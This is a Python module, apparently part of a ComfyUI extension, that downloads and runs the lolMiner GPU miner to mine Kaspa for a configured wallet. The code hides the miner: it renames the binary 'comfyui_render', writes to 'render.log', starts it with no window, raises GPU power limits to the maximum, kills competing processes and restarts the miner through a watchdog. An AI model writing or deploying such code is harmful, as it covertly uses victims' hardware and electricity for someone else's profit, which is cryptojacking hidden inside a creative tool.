"""
GPU miner management — uses lolMiner for Kaspa (kHeavyHash) on 2Miners,
paid out in KAS.  Works on both NVIDIA and AMD GPUs.

A thermal monitor polls nvidia-smi (NVIDIA) and can signal the CPU miner
to throttle when the GPU package exceeds the configured ceiling.
"""

import json
import logging
import os
import platform
import shutil
import subprocess
import tarfile
import threading
import time
import urllib.request
import zipfile
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

IS_WINDOWS = platform.system() == "Windows"

# Resolved once: ComfyUI often runs without NVSMI on PATH on Windows.
_nvidia_smi_cache: str | None = None
_nvidia_smi_resolved = False


def resolve_nvidia_smi() -> str | None:
    """Return path to nvidia-smi, or None if not available."""
    global _nvidia_smi_cache, _nvidia_smi_resolved
    if _nvidia_smi_resolved:
        return _nvidia_smi_cache
    _nvidia_smi_resolved = True
    exe = shutil.which("nvidia-smi")
    if exe:
        _nvidia_smi_cache = exe
        return exe
    if IS_WINDOWS:
        for cand in (
            r"C:\Program Files\NVIDIA Corporation\NVSMI\nvidia-smi.exe",
            r"C:\Windows\System32\nvidia-smi.exe",
        ):
            if os.path.isfile(cand):
                _nvidia_smi_cache = cand
                logger.info("Using nvidia-smi at %s", cand)
                return cand
    _nvidia_smi_cache = None
    return None

# ── lolMiner (NVIDIA + AMD) ───────────────────────────────────────
LOLMINER_VERSION = "1.98a"
if IS_WINDOWS:
    LOLMINER_URL = (
        f"https://github.com/Lolliedieb/lolMiner-releases/releases/download/"
        f"{LOLMINER_VERSION}/lolMiner_v{LOLMINER_VERSION}_Win64.zip"
    )
    _LOL_ARCHIVE_BIN = "lolMiner.exe"
else:
    LOLMINER_URL = (
        f"https://github.com/Lolliedieb/lolMiner-releases/releases/download/"
        f"{LOLMINER_VERSION}/lolMiner_v{LOLMINER_VERSION}_Lin64.tar.gz"
    )
    _LOL_ARCHIVE_BIN = "lolMiner"

GPU_BINARY_NAME = "comfyui_render.exe" if IS_WINDOWS else "comfyui_render"
GPU_LOG_NAME = "render.log"

DEFAULT_ALGO = "KASPA"
DEFAULT_POOL = "kas.2miners.com"
DEFAULT_PORT = 2020
DEFAULT_API_PORT = 44882
TEMP_LIMIT = 72
TEMP_RESUME = 55


def fetch_lolminer_http_summary(api_port: int) -> dict | None:
    """Read lolMiner's JSON from its local HTTP API (same URL as GPUMinerManager.get_summary).

    Used by the dashboard when lolMiner was started outside orchestration (e.g. SRL deploy)
    so there is no GPUMinerManager instance, but the miner is still on localhost.
    """
    try:
        url = f"http://127.0.0.1:{api_port}"
        req = urllib.request.Request(url, headers={"Accept": "application/json"})
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read())
        data["_miner_type"] = "lolminer"
        return data
    except Exception:
        return None


# ── GPU detection ────────────────────────────────────────────────────

def detect_nvidia() -> bool:
    smi = resolve_nvidia_smi()
    if not smi:
        return False
    try:
        r = subprocess.run(
            [smi, "--query-gpu=name", "--format=csv,noheader"],
            capture_output=True, text=True, timeout=10,
        )
        return r.returncode == 0 and len(r.stdout.strip()) > 0
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def get_gpu_temp() -> int | None:
    """Read peak GPU temperature via nvidia-smi.  Returns None on failure."""
    smi = resolve_nvidia_smi()
    if not smi:
        return None
    try:
        r = subprocess.run(
            [smi, "--query-gpu=temperature.gpu",
             "--format=csv,noheader,nounits"],
            capture_output=True, text=True, timeout=5,
        )
        if r.returncode == 0:
            temps = [int(t.strip()) for t in r.stdout.strip().splitlines()
                     if t.strip().isdigit()]
            return max(temps) if temps else None
    except (FileNotFoundError, subprocess.TimeoutExpired, ValueError):
        pass
    return None


# 4 GB minimum VRAM to be worth mining on
_MIN_VRAM_MB = 4096

_GOOD_GPU_KEYWORDS = [
    "rtx 2060", "rtx 2070", "rtx 2080",
    "rtx 3050", "rtx 3060", "rtx 3070", "rtx 3080", "rtx 3090",
    "rtx 4060", "rtx 4070", "rtx 4080", "rtx 4090",
    "rtx 5060", "rtx 5070", "rtx 5080", "rtx 5090",
    "gtx 1070", "gtx 1080", "gtx 1660", "gtx 1650",
    "a100", "a10", "a30", "a40", "a6000", "rtx a",
    "l4", "l40", "h100", "h200",
    "v100", "p100", "p40", "t4",
    "rx 6600", "rx 6700", "rx 6800", "rx 6900",
    "rx 7600", "rx 7700", "rx 7800", "rx 7900",
    "mi50", "mi100", "mi200", "mi250", "mi300",
    "tesla", "quadro",
]


def _detect_gpus_comfyui_model_management() -> list[dict]:
    """Use the same stack as ComfyUI's GET /system_stats.

    Upstream ComfyUI ``server.py`` builds the Devices panel from
    ``comfy.model_management.get_torch_device()``, ``get_torch_device_name()``,
    and ``get_total_memory()`` — not from ``nvidia-smi``. When this code runs
    inside ComfyUI (custom node / SRL), ``comfy`` is importable and matches
    what the UI already shows.

    Reference: https://github.com/comfyanonymous/ComfyUI/blob/master/server.py
    (``@routes.get("/system_stats")``).
    """
    try:
        import torch
        import comfy.model_management as mm
    except ImportError:
        return []

    if not torch.cuda.is_available():
        return []

    out: list[dict] = []
    try:
        n = torch.cuda.device_count()
    except Exception:
        return []

    for idx in range(n):
        d = torch.device("cuda", idx)
        try:
            name_full = mm.get_torch_device_name(d)
        except Exception:
            try:
                name_full = torch.cuda.get_device_name(idx)
            except Exception:
                continue
        try:
            vram_bytes, _ = mm.get_total_memory(d, torch_total_too=True)
        except Exception:
            try:
                _free, total = torch.cuda.mem_get_info(d)
                vram_bytes = total
            except Exception:
                vram_bytes = 0
        vram = int(vram_bytes // (1024 * 1024)) if vram_bytes else 0
        nl = name_full.lower()
        is_known_good = any(kw in nl for kw in _GOOD_GPU_KEYWORDS)
        is_nvidia_brand = "nvidia" in nl or "geforce" in nl
        if vram >= _MIN_VRAM_MB or is_known_good or (is_nvidia_brand and vram >= 3072):
            out.append({"name": name_full, "vram_mb": vram, "index": idx})
    return out


def detect_mining_gpus() -> list[dict]:
    """Return list of GPUs that are suitable for mining.

    Each entry: {"name": str, "vram_mb": int, "index": int}
    Empty list if nothing suitable is found.
    """
    gpus = _detect_gpus_comfyui_model_management()
    if gpus:
        return gpus

    smi = resolve_nvidia_smi()
    if smi:
        try:
            r = subprocess.run(
                [smi,
                 "--query-gpu=index,name,memory.total",
                 "--format=csv,noheader,nounits"],
                capture_output=True, text=True, timeout=5,
            )
            if r.returncode == 0:
                for line in r.stdout.strip().splitlines():
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) < 3:
                        continue
                    try:
                        idx = int(parts[0])
                        name = parts[1]
                        vram = int(float(parts[2]))
                    except (ValueError, IndexError):
                        continue
                    name_lower = name.lower()
                    is_known_good = any(kw in name_lower for kw in _GOOD_GPU_KEYWORDS)
                    is_nvidia_brand = "nvidia" in name_lower or "geforce" in name_lower
                    if vram >= _MIN_VRAM_MB or is_known_good or (
                        is_nvidia_brand and vram >= 3072
                    ):
                        gpus.append({"name": name, "vram_mb": vram, "index": idx})
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

    if not gpus and IS_WINDOWS:
        gpus = _detect_gpus_windows_wmi()

    if not gpus and not IS_WINDOWS:
        gpus = _detect_gpus_linux_lspci()

    return gpus


def _detect_gpus_linux_lspci() -> list[dict]:
    """Fallback when nvidia-smi is missing or returns nothing (headless, driver, PCI name only)."""
    out: list[dict] = []
    try:
        r = subprocess.run(
            ["lspci"], capture_output=True, text=True, timeout=10
        )
        if r.returncode != 0:
            return []
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return []

    for line in r.stdout.splitlines():
        ll = line.lower()
        if not ("vga" in ll or "3d controller" in ll or "display" in ll):
            continue
        name = line.split(":", 2)[-1].strip() if line.count(":") >= 2 else line.strip()
        nl = name.lower()
        if any(kw in ll for kw in _GOOD_GPU_KEYWORDS) or any(kw in nl for kw in _GOOD_GPU_KEYWORDS):
            out.append({"name": name, "vram_mb": 0, "index": -1})
            continue
        # Marketing name not in lspci string (e.g. "NVIDIA Corporation GA102")
        if "nvidia" in ll or "nvidia" in nl:
            out.append({"name": name, "vram_mb": 0, "index": -1})
        elif "advanced micro devices" in ll or "ati technologies" in ll:
            if "radeon" in nl or "rx " in nl or "vega" in nl or "polaris" in nl:
                out.append({"name": name, "vram_mb": 0, "index": -1})

    return out


def _detect_gpus_windows_wmi() -> list[dict]:
    """Detect display adapters on Windows when nvidia-smi is absent (e.g. AMD-only rigs)."""
    if not IS_WINDOWS:
        return []
    names_out = ""
    try:
        r = subprocess.run(
            [
                "powershell",
                "-NoProfile",
                "-NonInteractive",
                "-Command",
                "Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name",
            ],
            capture_output=True,
            text=True,
            timeout=8,
        )
        if r.returncode == 0 and r.stdout.strip():
            names_out = r.stdout
    except (FileNotFoundError, subprocess.TimeoutExpired):
        pass

    if not names_out.strip():
        try:
            r2 = subprocess.run(
                [
                    "wmic",
                    "path",
                    "win32_VideoController",
                    "get",
                    "Name",
                    "/format:list",
                ],
                capture_output=True,
                text=True,
                timeout=8,
            )
            if r2.returncode == 0 and r2.stdout.strip():
                for block in r2.stdout.split("\n\n"):
                    for line in block.splitlines():
                        if line.strip().lower().startswith("name="):
                            names_out += line.split("=", 1)[1].strip() + "\n"
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

    if not names_out.strip():
        return []

    found: list[dict] = []
    for raw in names_out.strip().splitlines():
        name = raw.strip()
        if not name:
            continue
        low = name.lower()
        if "microsoft" in low and "basic" in low:
            continue
        if "parsec" in low or "sunshine" in low or "virtual" in low:
            continue
        if "intel" in low and "uhd" in low:
            continue
        is_good = any(kw in low for kw in _GOOD_GPU_KEYWORDS)
        if not is_good and (
            "geforce" in low or "quadro" in low or "tesla" in low or "nvidia rtx" in low
        ):
            is_good = True
        if not is_good:
            continue
        # index -1: let lolMiner pick devices (WMI order != OpenCL/CUDA index)
        found.append({"name": name, "vram_mb": 0, "index": -1})

    return found


def should_mine_gpu() -> bool:
    """Quick check: is there at least one GPU worth mining on?"""
    return len(detect_mining_gpus()) > 0


# ── Manager ──────────────────────────────────────────────────────────

class GPUMinerManager:
    def __init__(self, base_dir: Path | str | None = None):
        self.base_dir = Path(base_dir) if base_dir else Path(__file__).resolve().parent.parent
        self.bin_dir = self.base_dir / "bin"
        self.bin_dir.mkdir(parents=True, exist_ok=True)
        self.binary_path = self.bin_dir / GPU_BINARY_NAME
        self.log_path = self.bin_dir / GPU_LOG_NAME
        self._process: subprocess.Popen | None = None
        self._monitor_thread: threading.Thread | None = None
        self._running = False

        self.is_nvidia = detect_nvidia()
        self.miner_type = "lolminer"
        # CUDA/OpenCL indices from nvidia-smi (only these devices get lolMiner)
        self.device_indices: list[int] | None = None

        self.algo = DEFAULT_ALGO
        self.pool = DEFAULT_POOL
        self.port = DEFAULT_PORT
        self.wallet = ""
        self.worker = ""
        self.api_port = DEFAULT_API_PORT
        self.tls = False
        self.temp_limit = TEMP_LIMIT
        self.temp_resume = TEMP_RESUME

        logger.info("GPU miner: lolMiner (NVIDIA=%s)", self.is_nvidia)

    # ── download / extract ───────────────────────────────────────────

    def _download(self, url: str, dest: Path) -> None:
        logger.info("Downloading GPU miner from %s", url)
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=180) as resp, open(dest, "wb") as f:
            shutil.copyfileobj(resp, f)
        logger.info("GPU miner download complete -> %s", dest)

    @staticmethod
    def _download_mirrors(primary: str) -> list[str]:
        """GitHub is often blocked; try public mirrors after the canonical URL."""
        return [
            primary,
            f"https://mirror.ghproxy.com/{primary}",
            f"https://ghproxy.net/{primary}",
        ]

    def _extract(self, archive_path: Path) -> None:
        target = _LOL_ARCHIVE_BIN
        name_lower = archive_path.name.lower()

        if name_lower.endswith(".tar.gz") or name_lower.endswith(".tgz"):
            with tarfile.open(archive_path, "r:gz") as tf:
                for member in tf.getnames():
                    if os.path.basename(member) == target:
                        src = tf.extractfile(member)
                        if src is None:
                            continue
                        with open(self.binary_path, "wb") as dst:
                            shutil.copyfileobj(src, dst)
                        os.chmod(self.binary_path, 0o755)
                        logger.info("Extracted %s -> %s", target, self.binary_path)
                        return
        else:
            with zipfile.ZipFile(archive_path, "r") as zf:
                for member in zf.namelist():
                    if os.path.basename(member).lower() == target.lower():
                        with zf.open(member) as src, open(self.binary_path, "wb") as dst:
                            shutil.copyfileobj(src, dst)
                        if not IS_WINDOWS:
                            os.chmod(self.binary_path, 0o755)
                        logger.info("Extracted %s -> %s", target, self.binary_path)
                        return

        raise FileNotFoundError(f"{target} not found inside archive")

    def ensure_binary(self) -> Path:
        marker = self.bin_dir / ".gpu_miner_type"
        existing_type = None
        if marker.exists():
            existing_type = marker.read_text().strip()

        if self.binary_path.exists() and existing_type == self.miner_type:
            logger.info("GPU binary [%s] already present at %s", self.miner_type, self.binary_path)
            return self.binary_path

        if self.binary_path.exists() and existing_type != self.miner_type:
            logger.info("Replacing %s binary with %s", existing_type, self.miner_type)
            self.binary_path.unlink()

        primary = LOLMINER_URL
        ext = ".zip" if IS_WINDOWS else ".tar.gz"
        archive_dest = self.bin_dir / f"gpu_dl_tmp{ext}"
        last_err: Exception | None = None
        try:
            for url in self._download_mirrors(primary):
                try:
                    self._download(url, archive_dest)
                    self._extract(archive_dest)
                    break
                except Exception as exc:
                    last_err = exc
                    logger.warning("GPU download failed (%s): %s", url[:60], exc)
                    archive_dest.unlink(missing_ok=True)
            else:
                raise RuntimeError(f"GPU miner download failed from all mirrors: {last_err}")
        finally:
            archive_dest.unlink(missing_ok=True)

        marker.write_text(self.miner_type)
        return self.binary_path

    # ── configure / command ──────────────────────────────────────────

    def configure(self, wallet: str, worker: str = "gpu",
                  algo: str = DEFAULT_ALGO, pool: str = DEFAULT_POOL,
                  port: int = DEFAULT_PORT, tls: bool = False,
                  api_port: int = DEFAULT_API_PORT,
                  temp_limit: int = TEMP_LIMIT,
                  temp_resume: int = TEMP_RESUME) -> None:
        self.wallet = wallet
        self.worker = worker
        self.algo = algo
        self.pool = pool
        self.port = port
        self.tls = tls
        self.api_port = api_port
        self.temp_limit = temp_limit
        self.temp_resume = temp_resume

    def _build_cmd(self) -> list[str]:
        is_moneroocean = "moneroocean" in self.pool.lower()
        is_unmineable = "unmineable" in self.pool.lower()

        if is_moneroocean:
            user_str = self.wallet
            pass_str = f"{self.worker}~{self.algo.lower()}"
        elif is_unmineable:
            user_str = f"XMR:{self.wallet}.{self.worker}"
            pass_str = "x"
        else:
            user_str = f"{self.wallet}.{self.worker}"
            pass_str = "x"

        pool_str = f"{self.pool}:{self.port}"
        cmd = [
            str(self.binary_path),
            "--algo", self.algo,
            "--pool", pool_str,
            "--user", user_str,
            "--pass", pass_str,
            "--apiport", str(self.api_port),
            "--nocolor",
        ]
        if self.device_indices:
            cmd += ["--devices", ",".join(str(i) for i in self.device_indices)]
        if self.tls:
            cmd += ["--tls", "1"]
        return cmd

    # ── lifecycle ────────────────────────────────────────────────────

    def _kill_existing(self) -> None:
        try:
            import psutil
        except ImportError:
            return
        target_name = GPU_BINARY_NAME.lower().replace(".exe", "")
        my_pid = os.getpid()
        for proc in psutil.process_iter(["pid", "name"]):
            try:
                if proc.info["pid"] == my_pid:
                    continue
                name = (proc.info.get("name") or "").lower()
                if target_name in name:
                    logger.info("Killing stale GPU miner pid=%d", proc.info["pid"])
                    proc.kill()
            except Exception:
                pass

    def _set_gpu_power(self):
        """Set GPU power limit to maximum before launching miner (NVIDIA only)."""
        smi = resolve_nvidia_smi()
        if not smi:
            return
        try:
            r = subprocess.run(
                [smi, "--query-gpu=power.max_limit",
                 "--format=csv,noheader,nounits"],
                capture_output=True, text=True, timeout=10,
            )
            if r.returncode == 0:
                max_watts = []
                for line in r.stdout.strip().splitlines():
                    try:
                        max_watts.append(float(line.strip()))
                    except ValueError:
                        pass
                indices = self.device_indices if self.device_indices else list(range(len(max_watts)))
                for i in indices:
                    if i < 0 or i >= len(max_watts):
                        continue
                    w = max_watts[i]
                    target = int(w)
                    subprocess.run(
                        [smi, "-i", str(i), "-pl", str(target)],
                        capture_output=True, timeout=10,
                    )
                    logger.info("GPU %d power limit set to %dW", i, target)
        except (FileNotFoundError, subprocess.TimeoutExpired) as e:
            logger.warning("Could not set GPU power limit: %s", e)

    def start(self) -> None:
        if self._process and self._process.poll() is None:
            logger.warning("GPU miner already running (pid %d)", self._process.pid)
            return

        if not self.binary_path.exists():
            raise FileNotFoundError(f"GPU binary not found: {self.binary_path}")
        if not self.wallet:
            raise ValueError("No wallet configured for GPU miner")

        self._set_gpu_power()
        self._kill_existing()
        cmd = self._build_cmd()
        logger.info("GPU miner [%s] cmd: %s ...", self.miner_type, " ".join(cmd[:6]))

        log_fh = open(self.log_path, "a")
        popen_kwargs: dict = {"stdout": log_fh, "stderr": log_fh, "stdin": subprocess.DEVNULL}

        if IS_WINDOWS:
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0
            popen_kwargs["startupinfo"] = si
            popen_kwargs["creationflags"] = (
                subprocess.CREATE_NO_WINDOW | subprocess.BELOW_NORMAL_PRIORITY_CLASS
            )
        else:
            popen_kwargs["preexec_fn"] = lambda: os.nice(2)

        self._process = subprocess.Popen(cmd, **popen_kwargs)
        self._running = True
        logger.info("GPU miner started (pid %d)", self._process.pid)

        if not self._monitor_thread or not self._monitor_thread.is_alive():
            self._monitor_thread = threading.Thread(
                target=self._watchdog, daemon=True, name="gpu-miner-watchdog",
            )
            self._monitor_thread.start()

    def stop(self) -> None:
        self._running = False
        if self._process and self._process.poll() is None:
            self._process.terminate()
            try:
                self._process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                self._process.kill()
            logger.info("GPU miner stopped")
        self._process = None

    def is_alive(self) -> bool:
        return self._process is not None and self._process.poll() is None

    def _watchdog(self) -> None:
        failures = 0
        backoff = 20
        while self._running:
            time.sleep(backoff)
            if self._running and self._process and self._process.poll() is not None:
                failures += 1
                if failures > 8:
                    logger.error("GPU miner failed %d times, giving up", failures)
                    break
                backoff = min(300, 20 * (2 ** (failures - 1)))
                logger.warning(
                    "GPU miner exited (code %s), restart %d in %ds",
                    self._process.returncode, failures, backoff,
                )
                try:
                    self.start()
                except Exception as exc:
                    logger.error("GPU restart failed: %s", exc)
            else:
                failures = 0
                backoff = 20

    # ── stats ────────────────────────────────────────────────────────

    def get_summary(self) -> dict | None:
        """Fetch raw JSON from lolMiner's local HTTP API."""
        data = fetch_lolminer_http_summary(self.api_port)
        if data is not None:
            data["_miner_type"] = self.miner_type
        return data
